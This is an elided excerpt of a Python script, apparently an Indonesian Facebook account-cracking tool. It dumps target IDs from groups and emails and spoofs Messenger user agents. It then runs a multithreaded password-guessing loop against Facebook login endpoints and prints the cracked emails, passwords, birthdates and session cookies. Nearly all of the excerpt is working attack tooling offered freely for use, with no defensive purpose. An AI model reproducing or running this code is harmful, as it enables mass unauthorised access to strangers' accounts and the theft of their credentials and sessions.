...
██║     ██║  ██║██║  ██║███████╗
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
 Selamat Datang {kk}{n}{P}, Ini Sc Free {kk}Jangan DiPerjual{P} Belikan""")
def logo2():
	return str(f"""  
███████╗ █████╗ ██████╗ ███████╗
██╔════╝██╔══██╗██╔══██╗╚══███╔╝
...
██║     ██║  ██║██║  ██║███████╗
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
 Selamat Datang {kk}user{P}, Ini Sc Free {kk}Jangan DiPerjual{P} Belikan""")
...
def ua_rozh():
	...
	B = f"Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone10,1;FBMD/iPhone;FBSN/iOS;FBSV/13.5;FBSS/2;FBID/phone;FBLC/de_DE;FBOP/5]" #ANDROID
	...
	D = f"Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/221.1.0.15.157;] [ip:157.240.217.35]"
	E = f"illa/5.0 (iPad; CPU OS 10_1_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Mobile/14B100 [FBAN/MessengerForiOS;FBAV/122.0.0.40.69;FBBV/61279955;FBDV/iPad4,1;FBMD/iPad;FBSN/iOS;FBSV/10.1.1;FBSS/2;FBCR/;FBID/tablet;FBLC/en_US;FBOP/5;FBRV/0]" #ANDROID ORERA MINI
...
def menu(n,t,c):
	...
	print(f" ├───[{hh}05{P}] Crack Grup          ╰────[{hh}11{P}] cek opsi akun")
	print(f" ├───[{hh}06{P}] Crack Gmail         ╰────[{hh}12{P}] keluar ({M}cookie{P})")
	print(' ──────────────────────────────────────────────────────────────────────────────────────────')
...
def clon_email():
	...
	global ok , cp
	print(f'╰─── Dump Dari Email, Max 1000 ID')
	nama = input(' ╰─── target : ')
	if ',' in str(nama):
...
def crack_masal(t,c):
    print(f' [{hh}!{P}] Pastikan ID Target Publik ')
    try:
        bz=0
    ...
    for bz in range(apa):
    	bz +=1
    	akun = input(f'\r [{hh}!{P}] Masukkan Id Yang Ke {bz} : ')
    	try:
...
def atur_atur():
	...
	print(f'{N}├───[{H}3{N}] Free ')
	print(f'{N}├──╭[{h}PILIH METODE{N}]────────────────────────────────────────────')
	hc = input(f'│  ╰─➣{h} ')
	if hc in ['1','01']:metode.append('mobile')
	elif hc in ['2','02']:metode.append('mbasic')
	elif hc in ['3','03']:metode.append('free')
	...
	if hu in ['1','01']:
		...
		for x in dump:
			id.append(x)
	print(f"{P} ─────────────────────────────")
	cp = input(f' [{hh}!{P}] Tampilkan Opsi Sesiw [ya/no]]\n[{hh}?{P}] Pilih : ')
	if cp in ['y','Y','ya','Ya','1','01','yy','YA','yA']:
		cepeh.append('ya')
	print(f"{P} ─────────────────────────────")
	apk = input(f' [{hh}!{P}] Tampilkan Apk Terkait [ya/no]\n[{hh}?{P}] Pilih  : ')
	if apk in ['y','Ya','ya','1']:akunok.append('apk')
	else:akunok.append('coki')
	print(f"{P} ─────────────────────────────")
	ch = input(f' [{hh}1{P}]. Manual [{hh}2{P}]. Gabung [{hh}3{P}]. Awuto\n[{hh}?{P}] Pilih Sandi  : ')
...
def otomatis():
	global ok,cp
	print(f"{P} ─────────────────────────────")
	print(f' 𝐀𝐤𝐮𝐧 𝐎𝐊 𝐃𝐢𝐬𝐢𝐦𝐩𝐚𝐧 𝐃𝐢 : {sim_ok}\n 𝐀𝐤𝐮𝐧 𝐂𝐏 𝐃𝐢𝐬𝐢𝐦𝐩𝐚𝐧 𝐃𝐢 : {sim_cp}')
	print(f"{P} ─────────────────────────────")
	awal = datetime.now()
	with tred(max_workers=30) as babas:
		for akun in id:
...
#			bx = ses.post(f'https://{url}/login/device-based/regular/login/?next=https%3A%2F%2F{url}%2Flogin%2Fsave-device%2F%3Flogin_source%3Dcomet_headerless_login&refsrc=deprecated&lwv=100&refid=9',data=date,headers=head,proxies=proxy)
			...
			if "checkpoint" in ses.cookies.get_dict():
				...
				if data in rescp:pass
					...
					if 'ya' in cepeh:
						...
						try:
							...
							m, d, y = ttl.split('/')
							m = tete[m]
							print(f'\r [{kk}>{P}] 𝙴𝙼𝙰𝙸𝙻  : {kk}{idf}{P}          \n [{kk}>{P}] 𝚂𝙰𝙽𝙳𝙸  : {kk}{pw}          {P}\n [{kk}>{P}] 𝙻𝙰𝙷𝙸𝚁  : {kk}{d} {m} {y}{P}           \n')
							sapi = f'{idf}|{pw}|{d} {m} {y}'
				...
				if data in resok:pass
					...
					if "coki" in akunok:
						print(f'\r [{hh}>{P}] 𝙴𝙼𝙰𝙸𝙻  : {hh}{idf}{P}          \n [{hh}>{P}] 𝚂𝙰𝙽𝙳𝙸  : {hh}{pw}          {P}\n [{hh}>{P}] 𝙲𝙾𝙾𝙺𝙸𝙴 : {hh}{kuki}{P}\n')
						break
					elif "apk" in akunok:
						cek_apk(idf,pw,kuki)
						break				
